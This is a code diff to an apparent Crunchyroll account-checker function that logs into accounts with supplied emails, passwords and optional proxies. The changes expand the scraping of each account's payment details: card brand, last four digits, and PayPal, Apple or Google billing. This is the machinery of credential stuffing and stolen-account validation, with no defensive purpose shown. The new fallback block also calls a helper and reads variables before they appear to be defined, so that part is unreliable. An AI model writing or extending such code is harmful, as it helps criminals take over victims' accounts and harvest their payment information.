@@ -1026,6 +1026,18 @@ def check_crunchyroll(email, password, proxy=None):
                             result['subscribable'] = 'Yes' if product.get('is_subscribable') else 'False'
                             result['free_trial'] = 'Yes' if items[0].get('active_free_trial') else 'False'
 
+                    # Extra fallback payment check in Products endpoint
+                    if result['payment_method'] == "Unknown" and prod_resp.status_code == 200:
+                        try:
+                            prod_json = prod_resp.json()
+                            extract_payment(prod_json)  # reuse the same function
+                            if card_brand and last4:
+                                result['payment_method'] = f"{card_brand} •••• {last4}"
+                            elif payment_method != "Unknown":
+                                result['payment_method'] = payment_method.capitalize()
+                        except:
+                            pass
+
                     # Benefits - STRONGER Payment extraction
                     benefits_resp = requests.get(
                         f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
@@ -1051,7 +1063,7 @@ def check_crunchyroll(email, password, proxy=None):
                                 result['plan_sub'] = f"UNKNOWN ({streams})"
                                 result['max_streams'] = streams
 
-                        # ================== ENHANCED PAYMENT (Brand + Last4) ==================
+                         # ================== SUPER STRONG PAYMENT EXTRACTION (v2) ==================
                         try:
                             benefits_json = benefits_resp.json()
                             payment_method = "Unknown"
@@ -1063,12 +1075,18 @@ def check_crunchyroll(email, password, proxy=None):
                                 if isinstance(data, dict):
                                     for k, v in data.items():
                                         k_lower = k.lower()
-                                        if 'brand' in k_lower and isinstance(v, str):
-                                            card_brand = v.capitalize()
-                                        if any(x in k_lower for x in ['last4', 'last_four']) and isinstance(v, (str, int)):
-                                            last4 = str(v).zfill(4)
-                                        if any(term in k_lower for term in ['payment', 'source', 'method', 'provider']):
-                                            if isinstance(v, str) and v.strip():
+                                        # Brand
+                                        if 'brand' in k_lower and isinstance(v, str) and v.strip():
+                                            card_brand = v.strip().capitalize()
+                                        # Last 4 digits
+                                        if any(x in k_lower for x in ['last4', 'last_four', 'last4digits']) and isinstance(v, (str, int)):
+                                            last4 = str(v).strip().zfill(4)
+                                        # Any payment related field
+                                        if any(term in k_lower for term in [
+                                            'payment', 'source', 'method', 'provider', 'billing',
+                                            'card', 'paypal', 'apple', 'google', 'type'
+                                        ]):
+                                            if isinstance(v, str) and v.strip() and v.lower() not in ['none', 'null', '']:
                                                 payment_method = v.strip()
                                         extract_payment(v)
                                 elif isinstance(data, list):
@@ -1077,10 +1095,14 @@ def check_crunchyroll(email, password, proxy=None):
 
                             extract_payment(benefits_json)
 
+                            # Final formatting
                             if card_brand and last4:
                                 result['payment_method'] = f"{card_brand} •••• {last4}"
                             elif payment_method != "Unknown":
                                 result['payment_method'] = payment_method.capitalize()
+                            else:
+                                result['payment_method'] = "Unknown"
+
                         except:
                             result['payment_method'] = "Unknown"
                         # ====================================================================
